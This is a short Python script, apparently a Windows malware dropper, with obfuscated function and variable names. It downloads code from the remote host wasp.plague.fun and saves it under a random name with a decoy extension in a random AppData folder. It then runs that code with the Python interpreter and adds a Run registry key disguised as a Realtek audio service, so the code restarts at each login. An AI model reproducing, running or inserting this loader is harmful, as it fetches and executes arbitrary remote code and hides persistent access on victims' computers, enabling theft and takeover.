from builtins import all, dir, exec, range, open, exit
from sys import executable
from urllib import request
from os import getenv, system, name, listdir
import winreg
from random import choice

exec("")
from os.path import isfile

if name != "nt":
    exit()


def sub_function_1():
    sub_variable_1 = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    sub_variable_2 = listdir(sub_variable_1)
    for _ in range(10):
        sub_variable_3 = choice(sub_variable_2)
        sub_variable_4 = sub_variable_1 + "\\" + sub_variable_3
        if not isfile(sub_variable_4) and " " not in sub_variable_3:
            return sub_variable_4
    return getenv("TEMP")


def sub_function_2():
    sub_variable_5 = "".join(choice("bcdefghijklmnopqrstuvwxyz") for _ in range(8))
    sub_variable_6 = [
        ".dll",
        ".png",
        ".jpg",
        ".gay",
        ".ink",
        ".url",
        ".jar",
        ".tmp",
        ".db",
        ".cfg",
    ]
    return sub_variable_5 + choice(sub_variable_6)


def sub_function_3(sub_variable_1):
    with open(sub_variable_1, mode="w", encoding="utf-8") as f:
        f.write(
            request.urlopen("http://wasp.plague.fun/grab/o6t1NXJzs1SY3M5T")
            .read()
            .decode("utf8")
        )


def sub_function_4(sub_variable_1):
    system(f"start {executable} {sub_variable_1}")


def sub_function_5(sub_variable_1):
    sub_variable_7 = "SecurityHealthSystray.exe"
    sub_variable_8 = f"{executable} {sub_variable_1}"
    sub_variable_9 = winreg.HKEY_CURRENT_USER
    sub_variable_10 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    sub_variable_11 = winreg.CreateKeyEx(
        sub_variable_9, sub_variable_10, 0, winreg.KEY_WRITE
    )
    winreg.SetValueEx(
        sub_variable_11,
        "Realtek HD Audio Universal Service",
        0,
        winreg.REG_SZ,
        f"{sub_variable_7} & {sub_variable_8}",
    )


sub_variable_12 = sub_function_1() + "\\" + sub_function_2()
sub_function_3(sub_variable_12)
sub_function_4(sub_variable_12)
try:
    sub_function_5(sub_variable_12)
except:
    pass